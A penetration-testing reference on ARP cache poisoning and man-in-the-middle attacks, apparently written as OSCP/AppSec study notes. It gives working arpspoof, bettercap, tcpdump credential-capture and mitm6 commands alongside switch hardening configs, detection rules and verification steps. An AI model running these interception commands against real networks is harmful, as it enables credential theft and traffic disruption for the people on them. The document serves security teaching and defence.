# MITM and ARP Spoofing

Man-in-the-middle attacks at Layer 2. ARP has no authentication: any
host on the same broadcast domain can claim any IP address. This file
covers ARP cache poisoning, the traffic interception that follows,
and the switch-level controls that stop it.

> [!CAUTION]
> ARP spoofing is disruptive. It can break connectivity for the target
> and, if the attacker crashes mid-attack, leave the target with a
> poisoned cache. Only run this against systems you own or have
> written authorization to test.

---

## 1. Overview

ARP (Address Resolution Protocol, RFC 826) maps an IPv4 address to a
MAC address inside a single broadcast domain. There is no
authentication and no state: a host accepts any ARP reply, even one
it did not ask for. An attacker sends forged ARP replies ("I am
10.0.0.1") and the victim caches the attacker's MAC for the
gateway's IP.

Once the cache is poisoned, all traffic from the victim to the
gateway flows through the attacker. The attacker forwards it (to
avoid detection) or drops it (denial of service). With forwarding
enabled, the attacker can read, modify, or inject traffic.

The same primitive exists for IPv6 via NDP (Neighbor Discovery
Protocol) spoofing; the tools and mitigations differ.

---

## 2. Reconnaissance / Enumeration

Identify the local subnet, the gateway, and potential targets before
spoofing. ARP spoofing only works within a single broadcast domain
(one VLAN, one switch segment).

```bash
# Local interface, network, gateway
ip a
ip route
ip neigh

# Discover live hosts on the segment (nmap ARP ping, no TCP)
sudo nmap -sn -PR 10.0.0.0/24

# Or with arp-scan (faster for a /24)
sudo arp-scan --interface=eth0 --localnet

# Confirm the current ARP table (baseline)
arp -an
```

What to look for:

- Gateway MAC (so you do not spoof it by mistake and cut your own access).
- Live hosts with predictable naming (e.g. `DESKTOP-*`, `PRINTER-*`).
- Any host already sending gratuitous ARP (some appliances do).

---

## 3. Common Attack Vectors

### 3.1 ARP cache poisoning

Send periodic forged ARP replies to keep the victim's cache poisoned.
The gateway is also poisoned, so return traffic flows through the
attacker too.

### 3.2 Gratuitous ARP (GARP) spoofing

A single unsolicited ARP reply updates every host on the segment.
Faster than per-target poisoning, but noisier and easier to detect.

### 3.3 MAC flooding

Fill the switch's CAM table with fake MACs. Once full, the switch
falls back to hub mode and floods all frames to all ports. Classic
but rarely needed today - modern switches have port security and
aging.

### 3.4 DHCP spoofing (see file 03)

A rogue DHCP server hands out the attacker as the gateway. Higher
impact than ARP spoofing because it survives across subnets if
DHCP relay is misconfigured.

### 3.5 SSL stripping (MITM follow-up)

With traffic intercepted, downgrade HTTPS to HTTP by rewriting
`https://` links and stripping HSTS headers. Modern HSTS preload
and HTTPS-only browsers make this less effective, but internal
apps often lag behind.

### 3.6 IPv6 NDP spoofing

The IPv6 equivalent of ARP spoofing. `mitm6` and `ettercap` support
it. Often more effective than ARP because IPv6 is enabled by default
on modern OSes and less monitored.

---

## 4. Exploitation Recipes

### 4.1 Enable IP forwarding

```bash
# Required, otherwise you cut the victim off the network
sudo sysctl -w net.ipv4.ip_forward=1
sudo sysctl -w net.ipv6.conf.all.forwarding=1
```

### 4.2 Two-way ARP poisoning with arpspoof

```bash
# Terminal 1: tell the victim that we are the gateway
sudo arpspoof -i eth0 -t 10.0.0.50 10.0.0.1

# Terminal 2: tell the gateway that we are the victim
sudo arpspoof -i eth0 -t 10.0.0.1 10.0.0.50
```

Expected output (terminal 1):

```text
8:0:27:aa:bb:cc 0:0:0:0:0:0 0806 42: arp reply 10.0.0.1 is-at 8:0:27:aa:bb:cc
8:0:27:aa:bb:cc 0:0:0:0:0:0 0806 42: arp reply 10.0.0.1 is-at 8:0:27:aa:bb:cc
```

### 4.3 One-shot with bettercap

```bash
sudo bettercap -iface eth0
# Inside bettercap:
#   set arp.spoof.targets 10.0.0.50
#   arp.spoof on
#   net.sniff on
```

### 4.4 Capture credentials

```bash
# After poisoning, watch for cleartext protocols
sudo tcpdump -i eth0 -A 'tcp port 21 or tcp port 23 or tcp port 110'
```

Look for FTP `USER`/`PASS`, Telnet sessions, POP3 `USER`/`PASS`.
For HTTP Basic auth, `Authorization: Basic <base64>` in the
request headers.

### 4.5 SSL stripping with bettercap

```bash
sudo bettercap -iface eth0
# Inside bettercap:
#   set http.proxy.sslstrip true
#   http.proxy on
#   arp.spoof on
```

### 4.6 IPv6 NDP spoofing with mitm6

```bash
sudo mitm6 -d corp.local
# Combine with ntlmrelayx for WPAD-based NTLM relay (see file 06)
```

---

## 5. Post-Exploitation

After a successful MITM:

- Credentials captured from cleartext protocols (FTP, Telnet, HTTP Basic).
- NTLM hashes from SMB/HTTP if relay is possible (file 06).
- Session cookies if the traffic is HTTP or if SSL stripping succeeded.
- Sensitive data in transit (internal APIs, database traffic without TLS).

Pivot options:

- The attacker is already on-path; no new host access is needed for
  passive interception.
- For active exploitation, relay captured hashes (Responder + ntlmrelayx).
- Use the position to reach hosts on the segment that were not
  directly accessible.

---

## 6. Risk Context (AppSec)

| Factor | Value |
|--------|-------|
| Typical severity | High to Critical |
| Preconditions | Attacker on the same broadcast domain (or a trunk port) |
| Detectability | Medium - DAI and ARP monitoring catch it; without them, nothing |
| Business impact | Credential theft, session hijack, data exfiltration |

ARP spoofing is a **lateral movement** primitive, not a foothold. It
requires the attacker to already have a presence on the network.

---

## 7. Root Causes (AppSec)

- ARP has no authentication mechanism (by design, 1982).
- Switches forward ARP replies without inspection by default.
- Dynamic ARP Inspection (DAI) is rarely enabled outside high-security
  environments.
- Cleartext protocols (FTP, Telnet, HTTP) are still in use for legacy
  and internal-only systems.
- HSTS is not enforced on internal web applications.

---

## 8. Preventive Controls (AppSec)

### 8.1 Dynamic ARP Inspection (DAI)

Validates ARP packets against a trusted DHCP snooping binding table.
Requires DHCP snooping to be enabled first.

```text
! Cisco IOS
ip dhcp snooping
ip dhcp snooping vlan 10
ip arp inspection vlan 10
interface GigabitEthernet0/1
 ip dhcp snooping trust
 ip arp inspection trust
```

### 8.2 Port security

Limit the number of MAC addresses per port. Prevents MAC flooding
and makes it harder to impersonate multiple hosts.

```text
interface GigabitEthernet0/1
 switchport port-security
 switchport port-security maximum 2
 switchport port-security violation restrict
```

### 8.3 802.1X port-based authentication

Requires authentication before the port becomes active. Blocks
unauthorized devices from the segment entirely.

### 8.4 DHCP snooping

Establishes the trust boundary for DAI. Marks ports connected to
legitimate DHCP servers as trusted, drops DHCP offers on untrusted
ports.

### 8.5 Encryption everywhere

- HTTPS with HSTS preload for all web apps (internal too).
- SSH instead of Telnet, FTPS/SFTP instead of FTP.
- SMB signing (see file 06) to block relay.
- TLS for internal APIs and database connections.

### 8.6 IPv6 hardening

- Disable IPv6 if not used (best defense against NDP spoofing).
- If IPv6 is required, use RA Guard and DHCPv6 Guard on access ports.

---

## 9. Detection Controls (AppSec)

### 9.1 ARP monitoring

- `arpwatch` on Linux hosts: alerts when an IP-MAC mapping changes.
- Switch logs: DAI violations produce syslog messages.
- SIEM rule: two different MACs claiming the same IP within a short window.

### 9.2 Network behavior

- Sudden traffic asymmetry (one host receiving traffic for many).
- Duplicate MAC address seen on two ports.
- Gratuitous ARP storms.

### 9.3 SSL stripping detection

- HTTP responses that should be HTTPS (3xx redirect to `http://`).
- Missing HSTS header on domains that usually send it.
- Certificate pinning alerts on mobile clients.

### 9.4 Sample Zeek rule (conceptual)

```text
event arp_reply(mac_src: string, mac_dst: string, SPA: addr, SHA: string)
    {
    if (SPA in known_gateways && SHA != known_gateways[SPA])
        NOTICE([$note=ARP_Spoofing,
                $msg=fmt("Gateway %s now at %s", SPA, SHA)]);
    }
```

---

## 10. Verification (AppSec)

Test the controls after deployment:

1. **DAI:** from an untrusted port, send a forged ARP reply
   (`arpspoof` or `scapy`). The switch should drop it and log a violation.
2. **Port security:** connect a small switch to an access port and
   generate traffic from multiple MACs. The port should err-disable.
3. **802.1X:** plug an unauthorized device into an access port. It
   should not get network access until authenticated.
4. **HSTS:** request the internal app over HTTP. It should redirect
   to HTTPS with `Strict-Transport-Security` in the response.
5. **IPv6:** if IPv6 is disabled, `mitm6` should find no targets.

---

## 11. OSCP Notes

ARP spoofing is not part of the standard OSCP exam (no Layer 2
access in the exam network). It is relevant for:

- The PEN-200 "Active Directory" and "Pivoting" modules (context).
- Real-world internal engagements where you land on a corporate LAN.

The technique itself is simple. The value in the exam report is the
**detection and mitigation** discussion, not the tooling.

---

## 12. Production Notes

- ARP spoofing on a production network is disruptive. Even with
  authorization, schedule a maintenance window and have a rollback
  plan (clear the poisoned ARP caches on affected hosts).
- On cloud networks (AWS, Azure), ARP spoofing is usually blocked by
  the hypervisor. Do not expect it to work in a VPC.
- On VMware/Hyper-V with promiscuous mode disabled, the hypervisor
  filters ARP replies between VMs. Check the vSwitch security policy.
- Wireless is a shared medium: ARP spoofing works there too, but
  many APs have client isolation enabled by default.

---

## 13. References

- RFC 826 - An Ethernet Address Resolution Protocol
- RFC 4861 - Neighbor Discovery for IPv6
- MITRE ATT&CK T1557.002 - ARP Cache Poisoning - https://attack.mitre.org/techniques/T1557/002/
- CIS Controls v8 - 12.6 (Network Infrastructure Management) - https://www.cisecurity.org/controls
- NIST SP 800-115 - Technical Guide to Information Security Testing
- `man arpspoof`, `man bettercap`, `mitm6` project documentation
